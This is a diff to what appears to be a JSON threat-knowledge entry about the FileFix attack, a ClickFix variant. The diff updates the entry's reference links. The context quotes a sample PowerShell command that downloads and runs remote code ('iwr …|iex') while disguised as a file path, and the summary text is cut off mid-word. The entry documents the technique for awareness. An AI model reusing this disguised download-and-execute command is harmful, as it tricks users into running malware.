@@ -14,8 +14,12 @@
     "summary": "Security researcher mr.d0x disclosed the FileFix attack in late June 2025, a variant of ClickFix. The technique tricks users into pasting clipboard content into the Windows File Explorer address bar, where a seemingly normal file path actually contains a malicious PowerShell command such as 'Powershell.exe -c \"iwr malicious.site/mal.jpg|iex\" # C:\\...\\Business-RFP.pdf'. This attack exploits user tr",
     "references": [
       {
-        "title": "On the Scene of a Real ClickFix Attack: The Full Process of a Social Engineering Hack",
-        "link": "https://www.anqueke.com/post/id/310802"
+        "title": "mr.d0x original disclosure: FileFix — A ClickFix Alternative (2025-06-23)",
+        "link": "https://mrd0x.com/filefix-clickfix-alternative/"
+      },
+      {
+        "title": "Kaspersky official blog: What is FileFix — a ClickFix variation?",
+        "link": "https://www.kaspersky.com/blog/filefix-attack-windows-file-explorer/54752/"
       }
     ]
   }
